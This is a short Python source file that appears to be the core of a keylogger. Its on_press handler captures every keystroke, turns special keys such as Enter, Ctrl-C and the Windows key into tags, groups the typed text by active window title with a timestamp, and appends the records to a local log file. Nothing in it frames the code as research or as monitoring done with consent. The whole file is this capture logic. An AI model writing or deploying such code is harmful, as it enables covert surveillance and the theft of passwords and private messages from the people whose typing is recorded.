import winname
import time
from collections import OrderedDict

substitution = {'Key.enter':'[ENTER]', 'Key.backspace':'[BACKSPACE]', 'Key.space': ' ',
	'Key.alt_l':'[ALT]', 'Key.tab':'[TAB]', 'Key.delete':'[DEL]', 'Key.ctrl_l':'[CTRL]', 
	'Key.left':'[LEFT ARROW]','Key.right':'[RIGHT ARROW]','Key.shift':'[SHIFT]','\\x13':
	'[CTRL-S]','\\x17':'[CTRL-W]', 'Key.caps_lock':'[CAPS LK]', '\\x01':'[CTRL-A]', 'Key.cmd':
	'[WINDOWS KEY]', 'Key.print_screen':'[PRNT SCR]', '\\x03':'[CTRL-C]', '\\x16':'[CTRL-V]'}

cache = OrderedDict()
chain = ''

def on_press(key):
	k = str(key)
	global cache
	global chain 
	win = winname.active_window()
	cache['stamp'] = time.ctime()
	if len(cache)==1:
		cache['win'] = win
		if k in substitution.keys():
			s =substitution[k]
			chain +=s
		else:
			s = k.replace("'","")
			chain +=s
			
	else:
		if cache['win'] == win:
			if k in substitution.keys():
				s =substitution[k]
				chain +=s
			else:
				s = k.replace("'","")
				chain +=s
				
		else:
			cache['keys'] = chain
			chain = ''
			od =OrderedDict(cache)
			for key in cache.keys():
				cache[key] = ''
			#cache = OrderedDict()
			cache['win'] = win
			if k in substitution.keys():
				s =substitution[k]
				chain +=s
				
			else:
				s = k.replace("'","")
				chain +=s
			s = f"stamp: {od['stamp']}	window: {od['win']} keys: {od['keys']}\n"
			with open('output/log_.txt', 'a+') as f:
				f.writelines(s)
			
	
